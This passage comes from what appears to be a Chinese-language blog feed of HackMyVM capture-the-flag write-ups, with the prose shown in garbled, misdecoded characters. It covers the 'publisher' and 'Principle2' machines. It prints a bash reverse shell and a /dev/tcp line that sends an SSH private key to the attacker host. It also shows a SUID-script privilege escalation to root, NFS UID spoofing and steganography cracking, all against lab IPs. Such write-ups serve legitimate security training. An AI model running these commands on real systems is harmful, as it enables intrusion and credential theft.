‰∏∫‰∫ÜËé∑ÂæóÊõ¥Á®≥ÂÆöÁöÑ shellÔºåÂàõÂª∫‰∏Ä‰∏™ÂèçÂêë shell ËÑöÊú¨ÔºåÂπ∂‰∏ä‰º†Âà∞ÁõÆÊ†áÊú∫Âô®Ôºö

```bash
cat a.sh  
bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1  
chmod +x a.sh  
bash a.sh
```

Ëé∑Âæó‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

### **5. Ëé∑Âèñ** **‚Äã**‚Äã**‚Äã`think`‚Äã**‚Äã**‚Äã** **Áî®Êà∑ SSH ÂØÜÈí•**

ËÆøÈóÆ `/home/` ÁõÆÂΩïÔºåÂèëÁé∞ `think` Áî®Êà∑ÁõÆÂΩï‰∏ãÁöÑ `.ssh` ÁõÆÂΩïÂÖ∑ÊúâËØªÂèñÊùÉÈôê„ÄÇÁî±‰∫éÊú¨Êú∫Ê≤°Êúâ SSH ÂÆ¢Êà∑Á´ØÔºåÂèØ‰ª•ÈÄöËøá `cat` Â∞ÜÁßÅÈí•‰º†ËæìÂõûÊîªÂáªÊú∫ÔºåÂπ∂ÁôªÂΩïÂà∞ÁõÆÊ†áÊú∫Âô®Ôºö

#### ÁõÆÊ†áÊú∫Âô®Ôºö

```bash
cat id_rsa &gt; /dev/tcp/192.168.205.141/7777
```

#### ÊîªÂáªÊú∫Ôºö

```bash
nc -lvnp 7777 &gt; id_rsa  
chmod 600 id_rsa  
ssh think@192.168.205.211 -i id_rsa
```

ÊàêÂäüÁôªÂΩï `think` Áî®Êà∑Ôºö

```bash
think@publisher:~$ id  
uid=1000(think) gid=1000(think) groups=1000(think)
```

---

### **6. ‰ΩøÁî®** **‚Äã**‚Äã**‚Äã`linpeas`‚Äã**‚Äã**‚Äã** **Êü•ÊâæÊèêÊùÉÊºèÊ¥û**

Â∞Ü `linpeas.sh` ËÑöÊú¨‰∏ä‰º†Ëá≥ÁõÆÊ†áÊú∫Âô®Ôºö

```bash
think@publisher:~$ curl 192.168.205.141:8000/linpeas.sh -o /home/think/linpeas.sh  
think@publisher:~$ chmod +x linpeas.sh  
think@publisher:~$ bash linpeas.sh
```

Âú®ËÑöÊú¨ËæìÂá∫‰∏≠ÔºåÂèëÁé∞‰∏Ä‰∏™Êú™Áü•ÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ `/usr/sbin/run_container`ÔºåÈÄöËøá `strings` ÂëΩ‰ª§ËøõË°åÂàÜÊûêÔºö

```bash
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$'
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

ÂèëÁé∞ËØ•‰∫åËøõÂà∂Êñá‰ª∂‰ºº‰πé‰∏é `/bin/bash`„ÄÅ`/opt/run_container.sh`Ôºå‰ºº‰πéÊòØ‰ΩøÁî®bashËøêË°å`/opt/run_container.sh`„ÄÇ‰ΩÜÊòØÂΩìÊàëÊü•Áúã`/opt/run_container.sh`Êó∂ÂèëÁé∞ÊàëÊ≤°Êúâ`/opt/`ÁõÆÂΩïÁöÑËÆøÈóÆÊùÉÈôêÔºåÁÑ∂ÂêéÂ∞±Ê≠áb‰∫ÜÔºåÂÆûÂú®ÂÅö‰∏çÂá∫Êù•ÊàëÂ∞±ÂéªÁúãÂÖ∂‰ªñÂ∏àÂÇÖÁöÑwp‰∫ÜÔºåÁúãÁöÑÊòØ`ll104567`Âíå`HGBE`‰∏§‰ΩçÂ∏àÂÇÖÁöÑwp,ÂèëÁé∞ÂΩìÂâç‰ΩøÁî®ÁöÑÊòØ`ÂèóÈôêÂ§ñÂ£≥`,ÈúÄË¶ÅÁªïËøá„ÄÇ

---

### **7. ÊèêÊùÉ‰∏∫ root**

ÈÄöËøáÂä®ÊÄÅÈìæÊé•Â∫ìÁîüÊàê `bash` shell Êù•ÊèêÊùÉ„ÄÇÈ¶ñÂÖàÔºåÂä†ËΩΩ `bash` ÊâÄÈúÄÁöÑÂÖ±‰∫´Â∫ìÔºö

```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

ËøêË°å `/usr/sbin/run_container`ËÆ©ÂÆÉËß¶ÂèëÊâßË°å`/opt/run_container.sh`ÔºåÂπ∂‰øÆÊîπ`/opt/run_container.sh`ËÑöÊú¨Ôºö

```bash
think@publisher:~$ echo '#!/bin/bash' &gt; /opt/run_container.sh
think@publisher:~$ echo 'chmod +s /bin/bash' &gt;&gt; /opt/run_container.sh
think@publisher:~$/usr/sbin/run_container
think@publisher:~$ cat /opt/run_container.sh
#!/bin/bash  
chmod +s /bin/bash  
```

ÁÑ∂Âêé‰ΩøÁî® `bash -p` ÊèêÂçáÊùÉÈôê‰∏∫ rootÔºö

```bash
think@publisher:~$ bash -p  
bash-5.0# id 
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

---

ÊàêÂäüËé∑Âèñ root ÊùÉÈôêÂêéÔºåÂ∑≤ÂÆåÂÖ®ÊéßÂà∂ÁõÆÊ†áÁ≥ªÁªü„ÄÇ

### ÂèÇËÄÉ

[HGBE](https://hgbe02.github.io/Hackmyvm/publisher.html)

[ll104567](https://www.bilibili.com/video/BV1TM4m1U7y4/)

[voltage](https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_publisher.html</guid><pubDate>Fri, 27 Jun 2025 09:33:34 +0000</pubDate></item><item><title>hmv_Principle2</title><link>https://7r1UMPHK.github.io/post/hmv_Principle2.html</link><description># hmv_Principle2

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.247
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
Host is up (0.00075s latency).
Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
35659/tcp open  unknown
42607/tcp open  unknown
43239/tcp open  unknown
43401/tcp open  unknown
46365/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
                                                                   
```

ÂÖ∂‰∏≠80Ôºå111Ôºå139Ôºå445Ôºå2049Á´ØÂè£Êàë‰ª¨ÊØîËæÉÊÑüÂÖ¥Ë∂£Ôºå‰ΩÜÊòØÊàëÂÖàÁúãsmbÊúçÂä°ÔºåÂõ†‰∏∫ÊàëÊÄï‰ªñÊï¥Âπ∫ËõæÂ≠ê

---

# 2.Ë∏©ÁÇπ

## prot 445

ps:ÂÆÉËøô‰∏™smbÊúçÂä°‰∏çÁü•ÈÅìÊòØÂÆÉÈù∂Êú∫ÊúâÂπ∫ËõæÂ≠êËøòÊòØÊàëÊîªÂáªÊú∫ÊúâÂπ∫ËõæÂ≠êÔºåÊàëÁî®‰∏ç‰∫ÜsmbmapÔºåËÄå‰∏îÊàëÁî®smbclientËÆøÈóÆÁõÆÂΩïÊúâÊ¶ÇÁéáÂ§±Ë¥•ÔºåÂ¶ÇÊûú‰Ω†Â§çÁé∞Â§±Ë¥•ÁöÑËØùÔºåÂ§öËØïÂá†Ê¨°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient //192.168.205.247/public
Password for [WORKGROUP\kali]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Nov 28 19:57:45 2023
  ..                                  D        0  Sun Nov 26 00:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023

                19962704 blocks of size 1024. 17182940 blocks available
smb: \&gt; get new_era.txt
getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
smb: \&gt; get straton.txt
getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
smb: \&gt; get loyalty.txt
getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
smb: \&gt; exit
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat new_era.txt                   
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
                                                                                                                                     

# new_era.txtÁøªËØë
Êò®Â§©ÂèëÁîü‰∫ÜÈáçÂ§ßÂèòÂåñÔºåÊñ∞ÊîøÂ∫úÔºåÊñ∞Â∏ÇÈïø„ÄÇÊâÄÊúâÂÖ¨Ê∞ëÈÉΩÈáçÊñ∞ÂàÜÈÖç‰∫Ü‰ªªÂä°„ÄÇ‰∏∫‰∫ÜÂÆâÂÖ®Ëµ∑ËßÅÔºåÊØè‰∏™Áî®Êà∑ÈÉΩÂ∫îËØ•Êõ¥ÊîπÂØÜÁ†Å„ÄÇ

# straton.txtÁøªËØë
ÊñØÁâπÊãâÈ°øÁöÑ„ÄäËÆ∫ÂÆáÂÆô„Äã‰∏≠ÁöÑËøôÊÆµÁâáÊÆµ‰ºº‰πéÂØπÁ•ñÂÖàÂíåÂàõÂßã‰∫∫ÈÉΩÂÖ∑ÊúâÈáçÂ§ßÊÑè‰πâ„ÄÇ

ÈòøÁ±≥Â°îÊñØÔºö‰ΩÜÊòØÔºåËøôÂëäËØâÊàë‰ª¨ÊúâÂÖ≥ÂÆáÂÆôÊú¨Ë¥®ÁöÑ‰ªÄ‰πàÔºå‰πüÂ∞±ÊòØÊàë‰ª¨Ê≠£Âú®ËÆ®ËÆ∫ÁöÑÔºü
ÊñØÁâπÊãâÈ°øÔºöËøôÊòØÊàë‰ª¨ÂøÖÈ°ªÂõûÁ≠îÁöÑ‰∏ã‰∏Ä‰∏™ÈóÆÈ¢ò„ÄÇÊàë‰ª¨‰ªéËá™ÊàëÂºÄÂßãÔºåÂõ†‰∏∫Ëá™ÊàëÂÜ≥ÂÆö‰∫ÜÊàë‰ª¨‰Ωú‰∏∫‰∏™‰ΩìÁöÑÂ≠òÂú®Ôºõ‰ΩÜÊòØÔºåÂ¶ÇÊûúÊ≤°ÊúâÂë®Âõ¥ÁöÑ‰∫ãÁâ©ÔºåËá™ÊàëÂ∞±Êó†Ê≥ïÂ≠òÂú®„ÄÇÂÖ¨Ê∞ëÁîüÊ¥ªÂú®ÂüéÂ∏Ç‰∏≠ÔºõÂüéÂ∏ÇÁîüÊ¥ªÂú®ÂÆáÂÆô‰∏≠„ÄÇÊâÄ‰ª•Áé∞Âú®Êàë‰ª¨ÂøÖÈ°ªÂ∞ÜÊàë‰ª¨ÂèëÁé∞ÁöÑÂéüÁêÜÂ∫îÁî®Âà∞Êõ¥ÂπøÈòîÁöÑ‰∏ñÁïåÔºåÂπ∂ÈóÆÔºöÂ¶ÇÊûú‰∫∫Â∞±ÂÉè‰∏ÄÂè∞Êú∫Âô®ÔºåÈÇ£‰πàÂÆáÂÆôÁöÑÊú¨Ë¥®ÊòØÂê¶‰πüÁ±ª‰ººÔºüÂ¶ÇÊûúÊòØËøôÊ†∑Ôºå‰ªéËøô‰∏™‰∫ãÂÆû‰∏≠ÂèØ‰ª•ÂæóÂá∫‰ªÄ‰πàÁªìËÆ∫Ôºü

# loyalty.txtÁøªËØë
ËøôÊÆµÊñáÂ≠óÂú®Êãú‰º¶ (7) ÂíåËµ´Â∞îÊõºÂä™ÊØîÊñØ (452) ÁöÑËæ©ËÆ∫‰∏≠ÂºïËµ∑‰∫ÜÁõ∏ÂΩìÂ§ßÁöÑ‰∫âËÆÆ„ÄÇ

Âõ†Ê≠§ÔºåÊàëËÆ§‰∏∫ÔºåÊàë‰ª¨Âπ∂ÈùûÁîüÊù•Â∞±ÊòØÂÆåÂÖ®Ëá™Áî±ÁöÑ‰∏™‰ΩìÔºåÂè™ÂØπËá™Â∑±Ë¥üË¥£„ÄÇÊàë‰ª¨Â≠òÂú®ÁöÑÊ†∏ÂøÉÔºåÊàë‰ª¨ÁöÑÁü•ËßâÔºåÂ∞ÜÊàë‰ª¨‰∏éÂä®Áâ©ÁéãÂõΩÂå∫ÂàÜÂºÄÊù•ÔºåÂπ∂‰ΩøÊàë‰ª¨È´ò‰∫éÂä®Áâ©ÁéãÂõΩ„ÄÇÊ≠£Â¶ÇÊàëÊâÄËØ¥ÔºåËøô‰∏çÊòØÂÇ≤ÊÖ¢ÁöÑÈóÆÈ¢òÔºåËÄåÊòØË¥£‰ªªÁöÑÈóÆÈ¢ò„ÄÇ

2257686f2061726520796f752c207468656e3f22

ÁÆÄËÄåË®Ä‰πãÔºöÊàë‰ª¨ÊØè‰∏™‰∫∫ÈÉΩÂØπ‰∫∫Á±ªÊú¨Ë∫´„ÄÅÂØπË∑®Ë∂äÊó∂Á©∫ÁöÑ‰∫∫Á±ªÈ°πÁõÆË¥üÊúâÂø†ËØöÁöÑ‰πâÂä°„ÄÇËøô‰∏çÊòØ‰∏Ä‰ª∂Â∞è‰∫ãÔºå‰πü‰∏çÊòØÂì≤Â≠¶ÂÆ∂ÁöÑÊäΩË±°ÈóÆÈ¢ò„ÄÇÂÆÉÊòØÊØè‰∏™‰∫∫ÁîüÂëΩ‰∏≠Ê∑±ÂàªËÄåÈáçË¶ÅÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇÂÆÉÊòØÊÑè‰πâÂíåÊ¥ûÂØüÂäõÁöÑÊôÆÈÅçÊ∫êÊ≥âÔºåÂèØ‰ª•Â∞ÜÊàë‰ª¨Âõ¢ÁªìÂú®‰∏ÄËµ∑Ôºå‰∏∫Êàë‰ª¨Èì∫Âπ≥ÈÄöÂæÄÊõ¥ÂÖâÊòéÊú™Êù•ÁöÑÈÅìË∑ØÔºõËøô‰πüÊòØ‰∏ÄÊù°ÂàÜÁïåÁ∫øÔºå‰∏ÄÊù°ÂøÖÈ°ª‰∏éÈÇ£‰∫õÂÆ£Êâ¨Ëá™ÊàëÊØÅÁÅ≠Á¶èÈü≥ÁöÑ‰∫∫ÂàíÊ∏ÖÁöÑÁïåÁ∫ø„ÄÇÊàë‰ª¨ÂøΩËßÜÂÆÉÔºåÂêéÊûúËá™Ë¥ü„ÄÇ
```

ÂÖ∂‰∏≠ÂØÜÁ†Å‰∏∫**Á©∫„ÄÇ**  Êàë‰ª¨ÊØîËæÉÊÑüÂÖ¥Ë∂£ÁöÑÊòØÈÇ£‰∏≤ÂÉèÂØÜÁ†Å‰∏ÄÊ†∑ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇsmbÊúçÂä°Â∞±ÂèØ‰ª•Âëä‰∏ÄÊÆµËêΩ‰∫Ü

---

## prot 80

80Á´ØÂè£ÊòØApache2ÁöÑÂàùÂßãÈ°µÔºåÂπ∂‰∏îÂÆÉÂ§ßÂ∞è‰∏∫Â∏∏ËßÑÂ§ßÂ∞è`10701`ÔºåÈÇ£Êàë‰ª¨ÁàÜÁ†¥ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.247 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.247
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
Progress: 110804 / 311425 (35.58%)[ERROR] parse 'http://192.168.205.247/besalu\t.php': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.html': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.txt': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.md': net/url: invalid control character in URL
/index.html           (Status: 200) [Size: 10701]
Progress: 311420 / 311425 (100.00%)
===============================================================
Finished
===============================================================
                                                                            
```

Êó†ÊûúÔºåÂëä‰∏ÄÊÆµËêΩ

---

## prot 111

Âõ†‰∏∫ÊàëÊ≤°ÊúâÊâìËøáËøô‰∏™ÊúçÂä°ÔºåÊàëÂ∞±Âéª[hacktricks](https://book.hacktricks.wiki/)ÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ã

**ËµÑÊñô**Ôºöhttps://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port

![image](https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65)

ÈòÖËØªÊñáÊú¨ÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ÂÆÉÂíåNFSË°îÊé•ÔºåÊàë‰ª¨ÂàöÂ•ΩÊúâNFS

**ËµÑÊñô**Ôºöhttps://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html

Êü•ÁúãÊåÇËΩΩ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ showmount -e 192.168.205.247
Export list for 192.168.205.247:
/var/backups *
/home/byron  *
                     
```

ps:*ÊåÇËΩΩËÆ∞ÂæóË¶ÅÁî®sudoÔºå‰∏çÁÑ∂ÂÆÉ‰ºöÊä•Èîô*

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo mount -t nfs 192.168.205.247:/var/backups /home/kali/test/tmp/backup
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
                                                                                                                                                                                                                                                          
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cd backup 
cd: ÊùÉÈôê‰∏çÂ§ü: backup
             
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sudo mount -t nfs 192.168.205.247:/home/byron /home/kali/test/tmp/home

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cd home
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home]
‚îî‚îÄ$ ls
mayor.txt  memory.txt
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home]
‚îî‚îÄ$ cat mayor.txt 
Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home]
‚îî‚îÄ$ cat memory.txt
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
                                        
# mayor.txtÁøªËØë
Áé∞Âú®ÊàëÂ∑≤ÁªèÊòØÂ∏ÇÈïø‰∫ÜÔºåÊàëËßâÂæóËµ´ÊõºÂä™ÊØîÊñØÊ≠£Âú®ÂØÜË∞ãÂèçÂØπÊàëÔºåÊàëÁåú‰ªñÊúâ‰∏Ä‰∏™ÁßòÂØÜÁªÑÁªáÂπ∂‰∏îÊääÂÆÉÈöêËóèËµ∑Êù•„ÄÇ

# memory.txtÁøªËØë     
Ëµ´ÊõºÂä™ÊØîÊñØÂëäËØâÊàëÔºå‰ªñÂøòËÆ∞‰∫ÜÂØÜÁ†ÅÔºåÊó†Ê≥ïÊõ¥ÊîπÔºåË∞¢Â§©Ë∞¢Âú∞ÔºåÊàë‰øùÂ≠ò‰∫ÜÊØè‰∏™ÈÇªÂ±ÖÁöÑÂè∑Á†ÅÂíåÂçÅÂÖ≠ËøõÂà∂ÂØÜÁ†ÅËÆ∞ÂΩï„ÄÇÊàëËÆ§‰∏∫‰ªñ‰ºöÊàê‰∏∫Êñ∞ËÄ∂Ë∑ØÊííÂÜ∑ÁöÑÂ•ΩÂ∏ÇÈïø„ÄÇ                                                
```

ÂëäËØâÊàë‰ª¨‰ªñ‰øùÂ≠ò‰∫ÜÊØè‰∏™ÈÇªÂ±ÖÁöÑÂè∑Á†ÅÂíåÂçÅÂÖ≠ËøõÂà∂ÂØÜÁ†ÅËÆ∞ÂΩïÔºåÂ∫îËØ•Â∞±Âú®Êàë‰ª¨Áúã‰∏ç‰∫ÜÈÇ£‰∏™Êñá‰ª∂Â§πÔºåÊàë‰ª¨ÂéªÊü•Áúã‰∏Ä‰∏ãÂÆÉÁöÑÊùÉÈôê

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ls -la
ÊÄªËÆ° 52
drwxrwxr-x  4 kali kali    4096  1Êúà12Êó• 10:26 .
drwxrwxr-x 31 kali kali   12288  1Êúà12Êó• 10:03 ..
drwxr--r--  2   54 backup 28672 2023Âπ¥11Êúà29Êó• backup
drwxr-xr-x  3 1001   1001  4096 2023Âπ¥11Êúà26Êó• home

```

ÂàõÂª∫ÂÖ∑ÊúâÁõ∏Âêå UID ÁöÑÁî®Êà∑ËøõË°åËÆøÈóÆÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ sudo useradd -u 54 hack
useradd warning: hack's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.
                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ su hack           
ÂØÜÁ†ÅÔºö 
$ bash
hack@kali:/home/kali/test/tmp$ cd backup/
hack@kali:/home/kali/test/tmp/backup$ ls
(ËøôÈáåÁúÅÁï•)

hack@kali:/home/kali/test/tmp/backup$ cat *.txt
(ËøôÈáåÁúÅÁï•)

```

Êàë‰ª¨Â∞ÜÂçÅÂÖ≠ËøõÂà∂Â∞ùËØïÊÅ¢Â§ç‰∏Ä‰∏ã

```bash
hack@kali:/home/kali/test/tmp/backup$ cat *.txt &gt; /tmp/a.txt
hack@kali:/home/kali/test/tmp/backup$ su kali
ÂØÜÁ†ÅÔºö 

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/backup]
‚îî‚îÄ$ cp /tmp/a.txt ~/test/a.txt
                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ xxd -ps -r a.txt | strings
(ËøôÈáåÁúÅÁï•)
ByronIsAsshole
(ËøôÈáåÁúÅÁï•)                
```

Ëé∑Âæó‰∫Ü‰∏Ä‰∏™Á±ª‰ººÂØÜÁ†ÅÁöÑ‰∏úË•øÔºåÂÆÉÊ≤°ÊúâÂºÄÊîæsshÁ´ØÂè£ÔºåÈÇ£Â∞±Âè™ÂèØËÉΩÊòØsmbÊúçÂä°ÁöÑÂØÜÁ†Å‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient -L //192.168.205.247// -N                       

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      New Jerusalem Public
        hermanubis      Disk      Hermanubis share
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.247 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient //192.168.205.247/hermanubis -U hermanubis
Password for [WORKGROUP\hermanubis]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Nov 28 22:44:44 2023
  ..                                  D        0  Wed Nov 29 09:13:50 2023
  index.html                          N      346  Tue Nov 28 22:44:41 2023
  prometheus.jpg                      N   307344  Wed Nov 29 01:23:24 2023

                19962704 blocks of size 1024. 17151324 blocks available
smb: \&gt; get index.html 
getting file \index.html of size 346 as index.html (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)
smb: \&gt; get prometheus.jpg 
getting file \prometheus.jpg of size 307344 as prometheus.jpg (11543.8 KiloBytes/sec) (average 6260.0 KiloBytes/sec)
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat index.html 
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Welcome to the resistance forum&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;h1&gt;Welcome to the resistance forum&lt;/h1&gt;

    &lt;p&gt;free our chains!&lt;/p&gt;

    &lt;img src='prometheus.jpg' alt='chained'&gt;

&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ exiftool prometheus.jpg   
ExifTool Version Number         : 13.00
File Name                       : prometheus.jpg
Directory                       : .
File Size                       : 307 kB
File Modification Date/Time     : 2025:01:12 12:33:09+08:00
File Access Date/Time           : 2025:01:12 12:33:09+08:00
File Inode Change Date/Time     : 2025:01:12 12:33:09+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1920x1080
Megapixels                      : 2.1
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ stegseek prometheus.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'soldierofanubis'   
[i] Original filename: 'secret.txt'.
[i] Extracting to 'prometheus.jpg.out'.

                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat prometheus.jpg.out
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
                                                                                                                                                                                              
```

